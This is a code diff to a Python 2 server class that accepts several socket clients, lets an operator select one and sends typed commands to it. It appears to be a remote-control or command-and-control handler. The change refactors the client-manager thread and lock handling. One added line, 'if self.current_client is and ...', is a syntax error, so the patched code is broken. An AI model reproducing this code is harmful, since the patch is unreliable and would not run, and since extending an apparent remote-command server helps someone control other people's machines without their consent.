@@ -102,6 +102,7 @@ class Server(object):
             '-h'            :   self.print_help,
             '?'             :   self.print_help
             }
+        self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
@@ -175,9 +176,8 @@ class Server(object):
     def select_client(self, client_id):
         if self.lock.is_set():
             self.lock.clear()
-        if self.current_client:
-            if self.current_client.lock.is_set():
-                self.current_client.lock.clear()
+        if self.current_client is and self.current_client.lock.is_set():
+            self.current_client.lock.clear()
         self.current_client = self.clients[int(client_id)]
         print '\nClient {} selected\n'.format(client_id)
         self.current_client.lock.set()
@@ -188,7 +188,6 @@ class Server(object):
             if self.current_client.lock.is_set():
                 self.current_client.lock.clear()
         self.current_client = None
-        self.run()
 
     def send_client(self, msg, client=None):
         if not client:
@@ -255,12 +254,17 @@ class Server(object):
                 break
 
     def run(self):
-        t1 = threading.Thread(target=self.client_manager)
-        t1.start()
+        if not self.manager.is_alive():
+            self.manager.start()
         while True:
             if exit_status:
                 break
-            self.lock.wait()
+            if self.current_client:
+                if self.lock.is_set():
+                    self.lock.clear()
+            else:
+                if not self.lock.is_set():
+                    self.lock.set()                
             output = ''
             cmd_buffer = raw_input('$ ')
             cmd, _, action = cmd_buffer.partition(' ')
